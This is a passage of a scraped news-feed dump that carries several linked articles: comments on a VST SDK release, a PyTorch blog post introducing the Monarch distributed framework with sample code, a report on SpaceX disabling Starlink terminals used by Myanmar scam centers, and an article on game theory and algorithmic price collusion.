        &lt;p&gt;Thank you for the release and thank you for changing the Licensing. That is a monumental change!&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 1 Like &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;
        &lt;p&gt;it’s working now. not sure what was wrong earlier. thanks!&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 1 Like &lt;/p&gt;
    &lt;/div&gt;
    &lt;div&gt;
      &lt;div&gt;rewgs
8&lt;/div&gt;
      &lt;div&gt;
        &lt;p&gt;Wow, this is huge!! Not just the MIT license, not just MIDI 2.0, but Wayland support as well?! This Linux nerd is very happy. Thank you all!!&lt;/p&gt;
      &lt;/div&gt;
      &lt;p&gt; 2 Likes &lt;/p&gt;
    &lt;/div&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://forums.steinberg.net/t/vst-3-8-0-sdk-released/1011988"/><published>2025-10-23T05:48:02+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45678603</id><title>Radios, how do they work? (2024)</title><updated>2025-10-23T17:37:18.391775+00:00</updated><content/><link href="https://lcamtuf.substack.com/p/radios-how-do-they-work"/><published>2025-10-23T05:56:23+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680237</id><title>PyTorch Monarch</title><updated>2025-10-23T17:37:18.142362+00:00</updated><content>&lt;doc fingerprint="bddc819de3a94aa8"&gt;
  &lt;main&gt;
    &lt;p&gt;We now live in a world where ML workflows (pre-training, post training, etc) are heterogeneous, must contend with hardware failures, are increasingly asynchronous and highly dynamic. Traditionally, PyTorch has relied on an HPC-style multi-controller model, where multiple copies of the same script are launched across different machines, each running its own instance of the application (often referred to as SPMD). ML workflows are becoming more complex: pre-training might combine advanced parallelism with asynchrony and partial failure; while RL models used in post-training require a high degree of dynamism with complex feedback loops. While the logic of these workflows may be relatively straightforward, they are notoriously difficult to implement well in a multi-controller system, where each node must decide how to act based on only a local view of the workflow’s state.&lt;/p&gt;
    &lt;p&gt;We believe that the long-term sustainable way to address this is through a single controller programming model, in which a single script orchestrates all distributed resources, making them feel almost local. This architectural shift simplifies distributed programming—your code looks and feels like a single-machine Python program, but can scale across thousands of GPUs. You can directly use Pythonic constructs—classes, functions, loops, tasks, futures—to express complex distributed algorithms.&lt;/p&gt;
    &lt;p&gt;We’re excited to introduce Monarch, a distributed programming framework that brings the simplicity of single-machine PyTorch to entire clusters.&lt;/p&gt;
    &lt;p&gt;Monarch lets you program distributed systems the way you’d program a single machine, hiding the complexity of distributed computing:&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Program clusters like arrays. Monarch organizes hosts, processes, and actors into scalable meshes that you can manipulate directly. You can operate on entire meshes (or slices of them) with simple APIs—Monarch handles the distribution and vectorization automatically, so you can think in terms of what you want to compute, not where the code runs.&lt;/item&gt;
      &lt;item&gt;Progressive fault handling. With Monarch, you write your code as if nothing fails. When something does fail, Monarch fails fast by default—stopping the whole program, just like an uncaught exception in a simple local script. Later, you can progressively add fine-grained fault handling exactly where you need it, catching and recovering from failures just like you’d catch exceptions.&lt;/item&gt;
      &lt;item&gt;Separate control from data. Monarch splits control plane (messaging) from data plane (RDMA transfers), enabling direct GPU-to-GPU memory transfers across your cluster. Monarch lets you send commands through one path, while moving data through another, optimized for what each does best.&lt;/item&gt;
      &lt;item&gt;Distributed tensors that feel local. Monarch integrates seamlessly with PyTorch to provide tensors that are sharded across clusters of GPUs. Monarch tensor operations look local but are executed across distributed large clusters, with Monarch handling the complexity of coordinating across thousands of GPUs.&lt;/item&gt;
    &lt;/list&gt;
    &lt;head rend="h3"&gt;Programming Model&lt;/head&gt;
    &lt;head rend="h4"&gt;Key APIs: Process and Actor Meshes&lt;/head&gt;
    &lt;p&gt;Monarch organizes resources into multidimensional arrays, or meshes. A process mesh is an array of processes spread across many hosts; an actor mesh is an array of actors, each running inside a separate process. Like array programming in NumPy or PyTorch, meshes make it simple to dispatch operations efficiently across large systems.&lt;/p&gt;
    &lt;p&gt;At launch, Monarch supports process meshes over GPU clusters—typically one process per GPU—onto which you can spawn actors into actor meshes. For local development, the same meshes can also run on a local development server.&lt;/p&gt;
    &lt;head rend="h4"&gt;Advanced APIs: Tensor Engine and RDMA Buffer&lt;/head&gt;
    &lt;p&gt;Monarch’s tensor engine brings distributed tensors to process meshes. It lets you write PyTorch programs as if the entire cluster of GPUs were attached to the machine running the script. For bulk data movement, Monarch also provides an RDMA buffer API, enabling direct, high-throughput transfers between processes on supported NICs.&lt;/p&gt;
    &lt;p&gt;Extensive details and more detailed examples can be found on our GitHub page.&lt;/p&gt;
    &lt;head rend="h4"&gt;A Simple Example&lt;/head&gt;
    &lt;p&gt;Monarch code imperatively describes how to create processes and actors using a simple Python API:&lt;/p&gt;
    &lt;quote&gt;from monarch.actor import Actor, endpoint, this_host procs = this_host().spawn_procs({"gpus": 8}) # define an actor that has one method class Example(Actor): @endpoint def say_hello(self, txt): return f"hello {txt}" # spawn the actors actors = procs.spawn("actors", Example) # have them say hello hello_future = actors.say_hello.call("world") # print out the results print(hello_future.get())&lt;/quote&gt;
    &lt;p&gt;In the above example, we define an Actor called “Example” that is deployed on 8 GPUs on the local host. The controller then invokes this example across the host and waits for their response. The actors can expose a variety of interfaces.&lt;/p&gt;
    &lt;head rend="h4"&gt;Slicing Meshes&lt;/head&gt;
    &lt;p&gt;We express broadcasted communication by organizing actors into a Mesh – a multidimensional container with named dimensions. For instance, a cluster might have dimensions {“hosts”: 32, “gpus”: 8}. Dimension names are normally things like “hosts”, indexing across the hosts in a cluster, or “gpus”, indexing across things in a machine.&lt;/p&gt;
    &lt;quote&gt;from monarch.actor import Actor, endpoint, this_host procs = this_host().spawn_procs({"gpus": 8}) # define an actor that has two methods class Example(Actor): @endpoint def say_hello(self, txt): return f"hello {txt}" @endpoint def say_bye(self, txt): return f"goodbye {txt}" # spawn the actors actors = procs.spawn("actors", Example) # have half of them say hello hello_fut = actors.slice(gpus=slice(0,4)).say_hello.call("world") # the other half say good bye bye_fut = actors.slice(gpus=slice(4,8)).say_bye.call("world") print(hello_fut.get()) print(bye_fut.get())&lt;/quote&gt;
    &lt;head rend="h4"&gt;Fault Recovery&lt;/head&gt;
    &lt;p&gt;Users can express distributed programs that can error through pythonic try, except blocks. Complex fault detection and fault recovery schemes can be built on top of these primitives. The following showcases handling a simple runtime Exception in a remote actor.&lt;/p&gt;
    &lt;quote&gt;from monarch.actor import Actor, endpoint, this_host procs = this_host().spawn_procs({"gpus": 8}) class Example(Actor): @endpoint def say_hello(self, txt): return f"hello {txt}" @endpoint def say_bye(self, txt): raise Exception("saying bye is hard") actors = procs.spawn("actors", Example) hello_fut = actors.slice(gpus=slice(0,4)).say_hello.call("world") bye_fut = actors.slice(gpus=slice(4,8)).say_bye.call("world") try: print(hello_fut.get()) except: print("couldn't say hello") try: print(bye_fut.get()) except Exception: print("got an exception saying bye")&lt;/quote&gt;
    &lt;p&gt;See “Case Study 2: Fault Tolerance in Large Scale Pre Training” for a more realistic use case.&lt;/p&gt;
    &lt;head rend="h2"&gt;The Monarch Backend&lt;/head&gt;
    &lt;p&gt;Monarch is split into a Python-based frontend, and a backend implemented in Rust. Python is the lingua franca of machine learning, and our Python frontend APIs allow users to seamlessly integrate with existing code and libraries (like PyTorch!), and to use Monarch with interactive computing tools like Jupyter notebooks. Our Rust-based backend facilitates our performance, scale, and robustness — we amply use Rust’s fearless concurrency in Monarch’s implementation.&lt;/p&gt;
    &lt;head rend="h3"&gt;Hyperactor and hyperactor_mesh&lt;/head&gt;
    &lt;p&gt;At the bottom of the stack is a Rust-based actor framework called hyperactor. Hyperactor is a low-level distributed actor system, focused on performant message passing and robust supervision. hyperactor_mesh is built on top of hyperactor, and combines its various components into an efficient “vectorized” actor implementation. Hyperactor_mesh is oriented towards providing actor operations cheaply over large meshes of actors.&lt;/p&gt;
    &lt;p&gt;Monarch’s core Python APIs, in turn, are fairly thin wrappers around hyperactor_mesh.&lt;/p&gt;
    &lt;head rend="h3"&gt;Scalable messaging&lt;/head&gt;
    &lt;p&gt;Everything in Monarch relies on scalable messaging: the core APIs supporting casting messages to large meshes of actors. Hyperactor achieves this through two mechanisms: multicast trees and multipart messaging.&lt;/p&gt;
    &lt;p&gt;First, in order to support multicasting, Hyperactor sets up multicast trees to distribute messages. When a message is cast, it is first sent to some initial nodes, which then forward copies of the message to a set of its children, and so on, until the message has been fully distributed throughout the mesh. This lets us avoid single-host bottlenecks, effectively using the whole mesh as a distributed cluster for message forwarding.&lt;/p&gt;
    &lt;p&gt;Second, we ensure that the control plane is never in the critical path of data delivery. For example, we use multipart messaging to avoid copying, to enable sharing data across high-fanout sends (such as those that occur in our multicast trees), and materialize into efficient, vectorized writes managed by the OS.&lt;/p&gt;
    &lt;head rend="h2"&gt;Case Studies&lt;/head&gt;
    &lt;p&gt;We believe that this general purpose API and its native integration with PyTorch will unlock the next generation of AI applications at scale and the more complex orchestration requirements that they present.&lt;/p&gt;
    &lt;head rend="h3"&gt;Case Study 1: Reinforcement Learning&lt;/head&gt;
    &lt;p&gt;Reinforcement learning has been critical to the current generation of frontier models. RL enables models to do deep research, perform tasks in an environment and solve challenging problems such as math and code. For a deeper dive, we recommend this post for a deeper dive into the topics.&lt;/p&gt;
    &lt;p&gt;In order to train a reasoning model (see figure below), generator processes produce prompts from the reasoning model specializing in a specific domain (say, programming code generation). The generator uses these prompts (an incomplete coding problem statement) to derive a set of solutions or trajectories (executable code in this example) often interacting with the world through tools (compiler) and environments. Reward pipelines evaluate these solutions and come up with scores. These scores and rewards are used to train the same model whose weights are then transferred back to the systems that generated the prompt responses.&lt;/p&gt;
    &lt;p&gt;This constitutes a single training loop! As illustrated in the figure below, this is effectively a real-time pipeline of a number of heterogeneous computations within a training loop that may have to be orchestrated and scaled individually.&lt;/p&gt;
    &lt;p&gt;When implementing the RL example above in Monarch, each component — generator, trainer, inference engine, reward pipeline — might be represented by a mesh: a mesh of generators, a mesh of trainers, a mesh of inference nodes, a mesh of reward pipelines. (The figure above shows a simplistic example with only two meshes: generator and trainer).&lt;/p&gt;
    &lt;p&gt;The training script then uses these meshes to orchestrate the overall flow of the job: telling the generator mesh to start working from a new batch of prompts, passing the data to the training mesh when they are done, and updating the inference mesh when a new model snapshot is ready. The orchestrator is written as an ordinary Python program, calling methods on meshes and passing data between them. Because Monarch supports remote memory transfers (RDMA) natively, the actual data is transferred directly between members of meshes (just like you might copy a tensor from one GPU to another), enabling efficient and scalable workflows.&lt;/p&gt;
    &lt;head rend="h4"&gt;VERL&lt;/head&gt;
    &lt;p&gt;Volcano Engine Reinforcement Learning (VERL) is a widely used Reinforcement Learning framework in the industry today.&lt;/p&gt;
    &lt;p&gt;We integrated Monarch with VERL as a proof-of-concept and post-trained the Qwen-2.5-7B math model using GRPO on a curated math dataset and evaluated it on the AIME 2024 benchmark. We trained for 500+ training steps on H200 GPUs using Megatron-LM scaling progressively from 16, 64, 1024 to 2048 GPUs. The runs were stable and yielded good numerical parity with existing options, demonstrating that Monarch can orchestrate existing RL frameworks.&lt;/p&gt;
    &lt;p&gt;We are actively working on open-sourcing this integration to allow future users to evaluate Monarch as an option in their VERL jobs.&lt;/p&gt;
    &lt;head rend="h4"&gt;TorchForge&lt;/head&gt;
    &lt;p&gt;TorchForge represents a different approach: a pytorch native RL framework designed from the ground up with Monarch primitives.&lt;/p&gt;
    &lt;p&gt;TorchForge’s goal is to let researchers express RL algorithms as naturally as pseudocode, while Monarch handles the distributed complexity underneath. The result is code that looks like this:&lt;/p&gt;
    &lt;quote&gt;async def continuous_rollouts(): while True: prompt, target = await dataloader.sample.route() response = await policy.generate.route(prompt) reward = await reward.evaluate_response.route(prompt, response.text, target) await replay_buffer.add.route(Episode(...))&lt;/quote&gt;
    &lt;p&gt;No distributed coordination code, no retry logic, just RL written in Python.&lt;/p&gt;
    &lt;head rend="h4"&gt;Building on Monarch: Services and TorchStore&lt;/head&gt;
    &lt;p&gt;This clean API is possible because torchforge builds two key abstractions on Monarch’s primitives:&lt;/p&gt;
    &lt;p&gt;“Services” wrap Monarch ActorMeshes with RL-specific patterns. They leverage Monarch’s fault tolerance, resource allocation, and mailbox system, while adding patterns like load-balanced routing (`.route()`), parallel broadcasts (`.fanout()`), and sticky sessions for stateful operations.&lt;/p&gt;
    &lt;quote&gt;# A service is a managed group of ActorMeshes with routing primitives policy = PolicyActor.options( procs=8, with_gpus=True, num_replicas=16 # Creates 16 replicas, each with 8 GPUs ).as_service() # Services provide RL-friendly adverbs built on Monarch actors response = await policy.generate.route(prompt) # Load-balanced routing await policy.update_weights.fanout(version) # Parallel broadcast&lt;/quote&gt;
    &lt;p&gt;TorchStore is a distributed key-value store for PyTorch tensors that handles weight synchronization between training and inference. Built on Monarch’s RDMA primitives and single-controller design, it provides simple DTensor APIs while efficiently resharding weights on the fly – critical for off-policy RL where training and inference use different layouts.&lt;/p&gt;
    &lt;p&gt;These abstractions demonstrate Monarch’s composability: torchforge uses Monarch’s primitives (actors, RDMA, fault tolerance) as building blocks to create RL-specific infrastructure. The resulting framework handles coordination complexity at the infrastructure layer, letting researchers focus on algorithms.&lt;/p&gt;
    &lt;p&gt;For detailed examples of Forge’s APIs, component integration, and design philosophy, see our torchforge blog post.&lt;/p&gt;
    &lt;head rend="h3"&gt;Case Study 2: Fault Tolerance in Large Scale Pre Training&lt;/head&gt;
    &lt;p&gt;Hardware and software failures are common and frequent at scale. For example, in our Llama3 training runs we experienced 419 interruptions across a 54 day training window for a 16k GPU training job. This averages to about one failure every 3 hours. If we project this out to 10s of thousands of GPUs, this represents a failure once every hour or more frequently. Restarting the entire job for each of these failures will reduce the effective training time.&lt;/p&gt;
    &lt;p&gt;A solution is to use methods to further leverage distributed training through methods to make the numerics of the model more tolerant of having the various groups run more asynchronously. For example, TorchFT, released from PyTorch, provides a way to withstand failures of GPUs and allow the training to continue. One strategy is to use Hybrid Sharded Data Parallelism that combines fault tolerant DDP with FSDP v2 and PP. On failure we use torchcomms to gracefully handle errors and UI training on the next batch without downtime. This isolates failures to a single “replica group” and we can continue training with a subset of the original job.&lt;/p&gt;
    &lt;p&gt;Monarch integrates with TorchFT. Monarch centralizes the control plane into a single-controller model. Monarch uses its fault detection primitives to detect failures, and upon detection, can spin up new logical replica groups (Monarch Meshes) to join training once initialized. TorchFT’s Lighthouse server acts as a Monarch actor. Monarch provides configurable recovery strategies based on failure type. On faults, the controller first attempts fast, process‑level restarts within the existing allocation and only escalates to job reallocation when necessary, while TorchFT keeps healthy replicas stepping so progress continues during recovery.&lt;/p&gt;
    &lt;p&gt;We ran this code on a 30 node (240 H100s) Coreweave cluster, using the SLURM scheduler to train Qwen3-32B using torchtitan and TorchFT. We injected 100 injected failures every 3 minutes across multiple failure modes (segfaults, process kills, NCCL abort, host eviction, GIL deadlock). Monarch allows for configurable recovery strategies based on failure type — we observed this to be 60% faster by avoiding unnecessary job rescheduling (relative to full SLURM job restarts). We see 90s avg recovery for process failures and 2.5min avg recovery machine failures. For more details, see the README.&lt;/p&gt;
    &lt;head rend="h3"&gt;Case Study 3: Interactive Debugging with a Large GPU cluster&lt;/head&gt;
    &lt;p&gt;The actor framework is not just limited to large scale orchestration of complex jobs. It enables the ability to seamlessly debug complex, multi-GPU computations interactively. This capability represents a fundamental shift from traditional batch-oriented debugging to real-time, exploratory problem-solving that matches the scale and complexity of contemporary AI systems.&lt;/p&gt;
    &lt;p&gt;Traditional debugging workflows break down when confronted with the realities of modern ML systems. A model that trains perfectly on a single GPU may exhibit subtle race conditions, deadlocks, memory fragmentation, or communication bottlenecks when scaled across dozens of accelerators.&lt;/p&gt;
    &lt;p&gt;Monarch provides an interactive developer experience. With a local jupyter notebook, a user can drive a cluster as a Monarch mesh.&lt;/p&gt;
    &lt;list rend="ol"&gt;
      &lt;item&gt;Persistent distributed compute allows very fast iteration without submitting new jobs&lt;/item&gt;
      &lt;item&gt;Workspace sync_workspace API quickly syncs local conda environment code to Mesh nodes.&lt;/item&gt;
      &lt;item&gt;Monarch provides a mesh-native, distributed debugger&lt;/item&gt;
    &lt;/list&gt;
    &lt;p&gt;See a jupyter tutorial at pytorch.org&lt;/p&gt;
    &lt;head rend="h3"&gt;Monarch + Lightning AI Notebook&lt;/head&gt;
    &lt;p&gt;See Monarch in action as we launch a 256-GPU training job from a single Studio notebook, powered by TorchTitan. Experience seamless scaling, persistent resources, and interactive debugging — all in one single Notebook. The figure above shows this schema. Also, see our Monarch-Lightning blog post. In this example, the traditional SPMD TorchTitan workload is encapsulated as an Actor within Monarch, allowing users to pre-train large language models (such as Llama-3 and Llama-4) interactively from a Studio Notebook.&lt;/p&gt;
    &lt;p&gt;Monarch enables you to reserve and maintain compute resources directly from your local Studio Notebook in lightning. Even if your notebook session is interrupted or code disconnects, your cluster allocation remains active through Multi-Machine Training (MMT). This persistence of the process allocator allows you to iterate, experiment, and resume work seamlessly, reducing manual intervention and making the notebook a reliable control center for distributed training tasks.&lt;/p&gt;
    &lt;p&gt;Using Monarch’s Actor model, you can define and launch the Titan Trainer as an Actor on a process mesh, scaling your training jobs to hundreds of GPUs – all from within the Studio notebook. Monarch handles the orchestration, code and file sharing, and log collection, so you can reconfigure and relaunch jobs quickly. Logs and metrics are available directly in the notebook, as well as through external tools like Litlogger and WandB, making it easy to monitor and manage large-scale training.&lt;/p&gt;
    &lt;p&gt;Monarch brings interactive debugging to distributed training. You can set Python breakpoints in your Actor code, inspect running processes, and attach to specific actors for real-time troubleshooting – all from the notebook interface. After training, you can modify configurations or define new actors and relaunch jobs on the same resources without waiting for new allocations. This dynamic workflow accelerates experimentation and provides deep insight into your distributed training runs.&lt;/p&gt;
    &lt;p&gt;The code snippet in the Monarch-Lightning blog post shows the sample Lightning studio notebook for Monarch to pre-train the Llama-3.1 – 8B model using TorchTitan on 256 GPUs.&lt;/p&gt;
    &lt;head rend="h3"&gt;Try Monarch Today: Build, Scale, and Debug Distributed AI Workflows with Ease&lt;/head&gt;
    &lt;p&gt;Monarch is available now on GitHub—ready for you to explore, build with, and contribute to. Dive into the Monarch repo to get started, explore the documentation for deeper technical details, and try out our interactive Jupyter notebook to see Monarch in action. For an end-to-end example of launching large-scale training directly from your notebook, check out the Lightning.ai integration. Whether you’re orchestrating massive training runs, experimenting with reinforcement learning, or interactively debugging distributed systems, Monarch gives you the tools to do it all—simply and at scale.&lt;/p&gt;
    &lt;head rend="h3"&gt;Acknowledgments&lt;/head&gt;
    &lt;p&gt;Thank you to the whole Monarch team for making this work possible. Also, a special thanks to our Top Contributors on GitHub!&lt;/p&gt;
    &lt;p&gt;Ahmad Sharif, Allen Wang, Alireza Shamsoshoara, Amir Afzali, Amr Mahdi, Andrew Gallagher, Benji Pelletier, Carole-Jean Wu, Chris Gottbrath, Colin Taylor, Davide Italiano, Dennis van der Staay, Eliot Hedeman, Gayathri Aiyer, Gregory Chanan, Hamid Shojanazeri, James Perng, James Sun, Jana van Greunen, Jayasi Mehar, Joe Spisak, John William Humphreys, Jun Li, Kai Li, Keyan Pishdadian, Kiuk Chung, Lucas Pasqualin, Marius Eriksen, Marko Radmilac, Mathew Oldham, Matthew Zhang, Michael Suo, Matthias Reso, Osama Abuelsorour, Pablo Ruiz Fischer Bennetts, Peng Zhang, Rajesh Nishtala, Riley Dulin, Rithesh Baradi, Robert Rusch, Sam Lurye, Samuel Hsia, Shayne Fletcher, Tao Lin, Thomas Wang, Victoria Dudin, Vidhya Venkat, Vladimir Ivanov, Zachary DeVito&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://pytorch.org/blog/introducing-pytorch-monarch/"/><published>2025-10-23T10:15:12+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680547</id><title>SpaceX disables 2,500 Starlink terminals allegedly used by Asian scam centers</title><updated>2025-10-23T17:37:17.944621+00:00</updated><content>&lt;doc fingerprint="3a4292199387e821"&gt;
  &lt;main&gt;
    &lt;p&gt;SpaceX said it disabled over 2,500 Starlink terminals suspected of being used by scammers in Myanmar. Lauren Dreyer, vice president of Starlink business operations, described the action in an X post last night after reports that Myanmar’s military shut down a major scam operation.&lt;/p&gt;
    &lt;p&gt;“SpaceX complies with local laws in all 150+ markets where Starlink is licensed to operate,” Dreyer wrote. “SpaceX continually works to identify violations of our Acceptable Use Policy and applicable law… On the rare occasion we identify a violation, we take appropriate action, including working with law enforcement agencies around the world. In Myanmar, for example, SpaceX proactively identified and disabled over 2,500 Starlink Kits in the vicinity of suspected ‘scam centers.'”&lt;/p&gt;
    &lt;p&gt;Starlink is not licensed to operate in Myanmar. While Dreyer didn’t say how the terminals were disabled, it’s known that Starlink can disable individual terminals based on their ID numbers or use geofencing to block areas from receiving signals.&lt;/p&gt;
    &lt;p&gt;On Monday, Myanmar state media reported that “Myanmar’s military has shut down a major online scam operation near the border with Thailand, detaining more than 2,000 people and seizing dozens of Starlink satellite Internet terminals,” according to an Associated Press article. The army reportedly raided a cybercrime center known as KK Park as part of operations that began in early September. The operations reportedly targeted 260 unregistered buildings and resulted in seizure of 30 Starlink terminals and detention of 2,198 people.&lt;/p&gt;
    &lt;p&gt;“Maj. Gen. Zaw Min Tun, the spokesperson for the military government, charged in a statement Monday night that the top leaders of the Karen National Union, an armed ethnic organization opposed to army rule, were involved in the scam projects at KK Park,” the AP wrote. The Karen National Union is “part of the larger armed resistance movement in Myanmar’s civil war” and “deny any involvement in the scams.”&lt;/p&gt;
    &lt;head rend="h2"&gt;Myanmar “notorious for hosting cyberscam operations”&lt;/head&gt;
    &lt;p&gt;Satellite images and drone footage recently showed “frenetic building work in the heavily guarded compounds around Myawaddy on the Thailand-Myanmar border, which appear to be using Elon Musk’s Starlink satellite Internet service on a huge scale,” Agence France-Presse (AFP) reported last week.&lt;/p&gt;
  &lt;/main&gt;
  &lt;comments/&gt;
&lt;/doc&gt;</content><link href="https://arstechnica.com/tech-policy/2025/10/starlink-blocks-2500-dishes-allegedly-used-by-myanmars-notorious-scam-centers/"/><published>2025-10-23T11:15:44+00:00</published></entry><entry><id>https://news.ycombinator.com/item?id=45680695</id><title>The game theory of how algorithms can drive up prices</title><updated>2025-10-23T17:37:17.707474+00:00</updated><content>&lt;doc fingerprint="a0e491a025250e9b"&gt;
  &lt;main&gt;
    &lt;head rend="h1"&gt;The Game Theory of How Algorithms Can Drive Up Prices&lt;/head&gt;
    &lt;head rend="h2"&gt;Introduction&lt;/head&gt;
    &lt;p&gt;Imagine a town with two widget merchants. Customers prefer cheaper widgets, so the merchants must compete to set the lowest price. Unhappy with their meager profits, they meet one night in a smoke-filled tavern to discuss a secret plan: If they raise prices together instead of competing, they can both make more money. But that kind of intentional price-fixing, called collusion, has long been illegal. The widget merchants decide not to risk it, and everyone else gets to enjoy cheap widgets.&lt;/p&gt;
    &lt;p&gt;For well over a century, U.S. law has followed this basic template: Ban those backroom deals, and fair prices should be maintained. These days, it’s not so simple. Across broad swaths of the economy, sellers increasingly rely on computer programs called learning algorithms, which repeatedly adjust prices in response to new data about the state of the market. These are often much simpler than the “deep learning” algorithms that power modern artificial intelligence, but they can still be prone to unexpected behavior.&lt;/p&gt;
    &lt;p&gt;So how can regulators ensure that algorithms set fair prices? Their traditional approach won’t work, as it relies on finding explicit collusion. “The algorithms definitely are not having drinks with each other,” said Aaron Roth, a computer scientist at the University of Pennsylvania.&lt;/p&gt;
    &lt;p&gt;Yet a widely cited 2019 paper showed that algorithms could learn to collude tacitly, even when they weren’t programmed to do so. A team of researchers pitted two copies of a simple learning algorithm against each other in a simulated market, then let them explore different strategies for increasing their profits. Over time, each algorithm learned through trial and error to retaliate when the other cut prices — dropping its own price by some huge, disproportionate amount. The end result was high prices, backed up by mutual threat of a price war.&lt;/p&gt;
    &lt;p&gt;Implicit threats like this also underpin many cases of human collusion. So if you want to guarantee fair prices, why not just require sellers to use algorithms that are inherently incapable of expressing threats?&lt;/p&gt;
    &lt;p&gt;In a recent paper, Roth and four other computer scientists showed why this may not be enough. They proved that even seemingly benign algorithms that optimize for their own profit can sometimes yield bad outcomes for buyers. “You can still get high prices in ways that kind of look reasonable from the outside,” said Natalie Collina, a graduate student working with Roth who co-authored the new study.&lt;/p&gt;
    &lt;p&gt;Researchers don’t all agree on the implications of the finding — a lot hinges on how you define “reasonable.” But it reveals how subtle the questions around algorithmic pricing can get, and how hard it may be to regulate.&lt;/p&gt;
    &lt;p&gt;“Without some notion of a threat or an agreement, it’s very hard for a regulator to come in and say, ‘These prices feel wrong,’” said Mallesh Pai, an economist at Rice University. “That’s one reason why I think this paper is important.”&lt;/p&gt;
    &lt;head rend="h2"&gt;No Regrets&lt;/head&gt;
    &lt;p&gt;The recent paper studies algorithmic pricing through the lens of game theory, an interdisciplinary field at the border of economics and computer science that analyzes the mathematics of strategic competitions. It’s one way to explore the failures of pricing algorithms in a controlled setting.&lt;/p&gt;
    &lt;p&gt;“What we’re trying to do is create collusion in the lab,” said Joseph Harrington, a University of Pennsylvania economist who wrote an influential review paper on regulating algorithmic collusion and was not involved in the new research. “Once we do so, we want to figure out how to destroy collusion.”&lt;/p&gt;
    &lt;p&gt;To understand the key ideas, it helps to start with the simple game of rock-paper-scissors. A learning algorithm, in this context, can be any strategy that a player uses to choose a move in each round based on data from previous rounds. Players might try out different strategies over the course of the game. But if they’re playing well, they’ll ultimately converge to a state that game theorists call equilibrium. In equilibrium, each player’s strategy is the best possible response to the other’s strategy, so neither player has an incentive to change.&lt;/p&gt;
    &lt;p&gt;In rock-paper-scissors, the ideal strategy is simple: You should play a random move each round, choosing all three possibilities equally often. Learning algorithms shine if one player takes a different approach. In that case, choosing moves based on previous rounds can help the other player win more often than if they just played randomly.&lt;/p&gt;
    &lt;p&gt;Suppose, for instance, that after many rounds you realize that your opponent, a geologist, chose rock more than 50% of the time. If you’d played paper every round, you would have won more often. Game theorists refer to this painful realization as regret.&lt;/p&gt;
    &lt;p&gt;Researchers have devised simple learning algorithms that are always guaranteed to leave you with zero regret. Slightly more sophisticated learning algorithms called “no-swap-regret” algorithms also guarantee that whatever your opponent did, you couldn’t have done better by swapping all instances of any move with any other move (say, by playing paper every time you actually played scissors). In 2000, game theorists proved that if you pit two no-swap-regret algorithms against each other in any game, they’ll end up in a specific kind of equilibrium — one that would be the optimal equilibrium if they only played a single round. That’s an attractive property, because single-round games are much simpler than multi-round ones. In particular, threats don’t work because players can’t follow through.&lt;/p&gt;
    &lt;p&gt;In a 2024 paper, Jason Hartline, a computer scientist at Northwestern University, and two graduate students translated the classic results from the 2000 paper to a model of a competitive market, where players can set new prices every round. In that context, the results implied that dueling no-swap-regret algorithms would always end up with competitive prices when they reached equilibrium. Collusion was impossible.&lt;/p&gt;
    &lt;p&gt;However, no-swap-regret algorithms aren’t the only pricing game strategies in the world of online marketplaces. So what happens when a no-swap-regret algorithm faces a different benign-looking opponent?&lt;/p&gt;
    &lt;head rend="h2"&gt;The Price Is Wrong&lt;/head&gt;
    &lt;p&gt;According to game theorists, the best strategy to play against a no-swap-regret algorithm is simple: Start with a specific probability for each possible move, and then choose one move at random every round, no matter what your opponent does. The ideal assignment of probabilities for this “nonresponsive” approach depends on the specific game you’re playing.&lt;/p&gt;
    &lt;p&gt;In the summer of 2024, Collina and her colleague Eshwar Arunachaleswaran set out to find those optimal probabilities for a two-player pricing game. They found that the best strategy assigned strikingly high probabilities to very high prices, along with lower probabilities for a wide range of lower prices. If you’re playing against a no-swap-regret algorithm, this strange strategy will maximize your profit. “To me, it was a complete surprise,” Arunachaleswaran said.&lt;/p&gt;
    &lt;p&gt;Nonresponsive strategies look superficially innocuous. They can’t convey threats, because they don’t react to their opponents’ moves at all. But they can coax learning algorithms to raise their prices, and then reap profits by occasionally undercutting their competitors.&lt;/p&gt;
    &lt;p&gt;At first, Collina and Arunachaleswaran thought that this artificial scenario wasn’t relevant to the real world. Surely the player using the no-swap-regret algorithm would switch to a different algorithm after realizing that their competitor was profiting at their expense.&lt;/p&gt;
    &lt;p&gt;But as they studied the problem further and discussed it with Roth and two other colleagues, they realized their intuition was wrong. The two players in their scenario were already in a state of equilibrium. Their profits were nearly equal, and both were as high as possible as long as neither player switched to a different algorithm. Neither player would have an incentive to change strategy, so buyers would be stuck with high prices. What’s more, the precise probabilities weren’t that important. Many different choices led to high prices when pitted against a no-swap-regret algorithm. It’s an outcome you’d expect from collusion, but without any collusive behavior in sight.&lt;/p&gt;
    &lt;head rend="h2"&gt;It Pays To Be Dumb&lt;/head&gt;
    &lt;p&gt;So, what can regulators do? Roth admits he doesn’t have an answer. It wouldn’t make sense to ban no-swap-regret algorithms: If everyone uses one, prices will fall. But a simple nonresponsive strategy might be a natural choice for a seller on an online marketplace like Amazon, even if it carries the risk of regret.&lt;/p&gt;
    &lt;p&gt;“One way to have regret is just to be kind of dumb,” Roth said. “Historically, that hasn’t been illegal.”&lt;/p&gt;
    &lt;p&gt;As Hartline sees it, the problem of algorithmic collusion has a simple solution: Ban all pricing algorithms except the no-swap-regret algorithms that game theorists have long favored. There may be practical ways to do this: In their 2024 work, Hartline and his colleagues devised a method for checking if an algorithm has a no-swap-regret property without looking at its code.&lt;/p&gt;
    &lt;p&gt;Hartline acknowledged that his preferred solution wouldn’t prevent all bad outcomes when no-swap-regret algorithms compete with humans. But he argued that scenarios like the one in Roth’s paper aren’t cases of algorithmic collusion.&lt;/p&gt;
    &lt;p&gt;“Collusion is a two-way thing,” he said. “It fundamentally must be the case that there are actions a single player can do to not collude.”&lt;/p&gt;
    &lt;p&gt;Either way, the new work still leaves many open questions about how algorithmic pricing can go wrong in the real world.&lt;/p&gt;
